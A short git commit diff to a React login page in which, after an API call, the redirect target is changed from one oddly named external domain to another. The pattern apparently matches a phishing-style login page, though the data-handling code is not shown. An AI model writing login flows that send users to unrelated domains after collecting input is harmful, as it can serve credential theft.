dc5501bac94822144860074fd39a5bf5d215583b
husknet <127146284+husknet@users.noreply.github.com>
2025-02-18 13:12:36 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://nero-store.logline-mlzroloft.top/';
+      window.location.href = 'https://ne.cookbarter.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
